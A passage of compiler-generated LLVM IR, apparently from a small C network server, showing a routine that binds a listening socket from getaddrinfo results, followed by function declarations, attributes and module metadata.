  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 noundef %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %19, i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.75, i64 0, i64 0), i8* noundef %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 noundef %31, i32 noundef %34, i32 noundef %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 noundef %43, i32 noundef 1, i32 noundef 2, i8* noundef %44, i32 noundef 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.76, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 noundef %49, %struct.sockaddr* noundef %52, i32 noundef %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 noundef %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %71, i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.77, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* noundef %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32 noundef) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8* noundef, i8* noundef, %struct.addrinfo* noundef, %struct.addrinfo** noundef) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32 noundef) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo* noundef) #3

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.ident = !{!0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
